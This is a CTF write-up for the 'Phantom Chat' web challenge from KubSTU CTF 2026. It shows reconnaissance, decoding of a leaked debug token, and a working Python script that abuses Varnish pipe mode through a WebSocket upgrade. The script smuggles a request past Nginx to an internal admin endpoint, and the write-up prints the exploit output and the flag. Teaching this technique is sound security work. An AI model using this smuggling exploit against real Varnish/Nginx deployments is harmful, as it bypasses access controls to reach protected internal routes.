# The Phantom Chat

> **分类：** Web · **赛事：** KubSTU CTF 2026 Autumn · **难度：** Hard

## 📌 题目

「Phantom Messenger」是一个企业级即时通讯应用，采用多层架构：Varnish → Nginx → Backend。Nginx 保护内部路由（对 `/internal/*` 执行 `deny all`），但在 `/ws` 上发起一次 WebSocket upgrade 会让 Varnish 进入 pipe mode，并打开一条直通后端的原始 TCP 隧道。目标是通过这条隧道走私（smuggle）第二个 HTTP 请求，在绕过 Nginx 的情况下触达 `/internal/admin/flag`。

**附件：** [recon-headers.txt](../../../assets/Web/Phantom%20Chat/recon-headers.txt) · [ws-426-response.txt](../../../assets/Web/Phantom%20Chat/ws-426-response.txt) · [exploit-output.txt](../../../assets/Web/Phantom%20Chat/exploit-output.txt)

## 🏁 解题思路

### 1. 应用概览

打开 `http://CHALLENGE_HOST:35802`，我们看到一个企业级即时通讯应用「Phantom Messenger」的首页：

![Landing Page](../../../assets/Web/Phantom%20Chat/01-landing.png)

网站看起来像一个成熟的产品——有注册、授权、带频道的聊天，以及 Pricing、Docs、About 等页面。

### 2. 注册与登录

我们注册并登录进这个即时通讯应用：

![Register](../../../assets/Web/Phantom%20Chat/02-register.png)

![Login](../../../assets/Web/Phantom%20Chat/03-login.png)

登录之后，我们进入一个带有 #general、#engineering、#devops 等频道的聊天。一个没有任何明显提示的普通企业级即时通讯应用。

### 3. 侦察（Recon）

#### 3.1. HTTP 头

我们从分析响应头开始：

```bash
$ curl -sI http://localhost:35802/
```

```
Server: nginx/1.25.5
Via: 1.1 fd54f2d70807 (Varnish/7.4)
X-Varnish: 29
Strict-Transport-Security: max-age=31536000; includeSubDomains
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
```

**关键发现：**
- `Via: 1.1 ... (Varnish/7.4)` —— 前端放着一个 Varnish
- `Server: nginx/1.25.5` —— Varnish 后面是 Nginx

这是一个多层架构：**Varnish → Nginx → Backend**

#### 3.2. 寻找接口

通过暴力枚举或经由 `/api/info`，我们找到：

```bash
$ curl -s http://localhost:35802/api/info | python -m json.tool
```

```json
{
    "service": "phantom-messenger",
    "version": "2.1.0",
    "endpoints": {
        "channels": "/api/channels",
        "health": "/api/health",
        "info": "/api/info",
        "status": "/api/status"
    }
}
```

#### 3.3. 发现 WebSocket 接口

通过 dirsearch/ffuf，或分析聊天中的 JS，我们找到 `/ws`：

```bash
$ curl -sI http://localhost:35802/ws \
  -H "Upgrade: websocket" \
  -H "Connection: Upgrade" \
  -H "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==" \
  -H "Sec-WebSocket-Version: 7"
```

```
HTTP/1.1 426 Upgrade Required
Server: Go-H2C
Sec-Websocket-Version: 13
X-Debug-Auth: UGhhbnRvbUJ5cGFzczIwMjY=
Content-Type: application/json
```

**关键发现：**
1. `Server: Go-H2C` —— 后端是用 Go 写的（不是 nginx！）
2. **`X-Debug-Auth: UGhhbnRvbUJ5cGFzczIwMjY=`** —— 一个泄露的 debug 头！
3. 响应是 `426` 而不是 `101` —— WebSocket 版本被拒绝了
4. `Via` 头**不存在**了 —— 请求绕过 Nginx，**直接**打到了后端！

#### 3.4. 解码令牌

```bash
$ echo "UGhhbnRvbUJ5cGFzczIwMjY=" | base64 -d
PhantomBypass2026
```

我们拿到了令牌：`PhantomBypass2026`

### 4. 理解漏洞

#### 架构：
```
Client → Varnish:6081 → Nginx:80 → Backend:5000
              ↓ (if Upgrade + /ws)
              └──── pipe ────→ Backend:5000 (напрямую, минуя Nginx!)
```

#### 关键观察：

1. 当带着 `Upgrade: websocket` 头请求 `/ws` 时，Varnish 切换到 **pipe mode**（一条直通后端的原始 TCP 隧道）
2. 后端用 `426`（而不是 `101`）回应，但 **Varnish 已经处于 pipe mode**，不会检查响应
3. TCP 连接保持打开——可以在同一个连接上发送**第二个 HTTP 请求**
4. 这个请求会直接打到后端，**绕过 Nginx** 及其 ACL

#### Nginx 阻挡了什么：
- 对 `/internal/*` 的 `deny all`
- 剥离 `X-Internal-Token` 头

#### 我们绕过了什么：
通过 smuggling，请求**直接**打到后端——Nginx 根本看不到它！

### 5. 利用

#### 5.1. WebSocket Smuggling（Python）

```python
import socket
import base64

host = "CHALLENGE_HOST"
port = 35802

# Шаг 1: WebSocket upgrade с невалидной версией
upgrade = (
    f"GET /ws HTTP/1.1\r\n"
    f"Host: {host}\r\n"
    f"Upgrade: websocket\r\n"
    f"Connection: Upgrade\r\n"
    f"Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\n"
    f"Sec-WebSocket-Version: 7\r\n"
    f"\r\n"
)

# Шаг 2: Smuggled запрос к internal endpoint
smuggled = (
    f"GET /internal/admin/flag HTTP/1.1\r\n"
    f"Host: localhost\r\n"
    f"X-Internal-Token: PhantomBypass2026\r\n"
    f"Connection: close\r\n"
    f"\r\n"
)

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.settimeout(10)
sock.connect((host, port))

# Отправляем upgrade → Varnish входит в pipe mode
sock.sendall(upgrade.encode())

# Читаем 426 ответ (Varnish его пропускает, тоннель открыт)
response = b""
while b"\r\n\r\n" in response is False or len(response) < 10:
    chunk = sock.recv(4096)
    if not chunk: break
    response += chunk
    if b"\r\n\r\n" in response: break

print(response.decode())

# Отправляем smuggled запрос — идёт напрямую к бэкенду!
sock.sendall(smuggled.encode())

# Получаем флаг
flag_response = b""
while True:
    try:
        chunk = sock.recv(4096)
        if not chunk: break
        flag_response += chunk
    except: break

print(flag_response.decode())
sock.close()
```

#### 5.2. 利用输出

```
============================================================
  The Phantom Upgrade - WebSocket Smuggling Exploit
============================================================

[*] Connecting to localhost:35802
[*] Sending WebSocket Upgrade with invalid version (Sec-WebSocket-Version: 7)
[*] Reading 426 response from backend (Varnish stays in pipe mode)...
[*] Got response: HTTP/1.1 426 Upgrade Required
[+] Found token hint in X-Debug-Auth: PhantomBypass2026
[*] Tunnel is open! Sending smuggled request to /internal/admin/flag
[*] Reading flag response...

[+] Smuggled response:
HTTP/1.1 200 OK
Content-Type: application/json
Server: Go-H2C

{"flag":"KubSTU{v4rn1sh_p1p3_m0d3_w3bs0ck3t_smuggl1ng}",
 "message":"Congratulations! You've mastered WebSocket smuggling through the Phantom Upgrade."}

[!!!] FLAG: KubSTU{v4rn1sh_p1p3_m0d3_w3bs0ck3t_smuggl1ng}
```

### 6. 简要攻击链

```
1. Recon → обнаруживаем Varnish + Nginx по заголовкам
2. Находим /ws endpoint (dirsearch / JS analysis)
3. WebSocket handshake с Version:7 → 426 + X-Debug-Auth утечка
4. base64 decode → PhantomBypass2026
5. Понимаем: Varnish pipe mode → прямой тоннель к бэкенду
6. Smuggling: второй HTTP-запрос через открытый тоннель
7. GET /internal/admin/flag + X-Internal-Token → FLAG!
```

### 7. Flag

```
KubSTU{v4rn1sh_p1p3_m0d3_w3bs0ck3t_smuggl1ng}
```

### 来源

- [WebSocket Smuggling](https://www.intruder.io/research/practical-http-header-smuggling)
- [Varnish pipe mode documentation](https://varnish-cache.org/docs/trunk/users-guide/vcl-built-in-subs.html)
- [RFC 6455 — The WebSocket Protocol](https://tools.ietf.org/html/rfc6455)

**Flag:** `KubSTU{v4rn1sh_p1p3_m0d3_w3bs0ck3t_smuggl1ng}`
